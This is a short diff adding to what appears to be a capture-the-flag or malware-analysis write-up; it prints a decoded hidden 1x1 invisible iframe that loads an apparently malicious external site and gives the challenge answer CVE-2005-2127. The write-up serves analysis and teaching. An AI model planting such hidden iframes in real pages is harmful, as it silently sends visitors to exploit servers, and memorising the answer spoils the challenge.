@@ -1397,6 +1397,12 @@ document.write(m);
 </script>
 ```
 
+Compiled:
+```c
+<iframe src="http://sploitme.com.cn/?click=84c090bd86" width=1 height=1 style="visibility: hidden"></iframe>
+```
+
+- It redirects to the link 'http://sploitme.com.cn/?click=84c090bd86'
 
 -> Answer: `CVE-2005-2127`
 
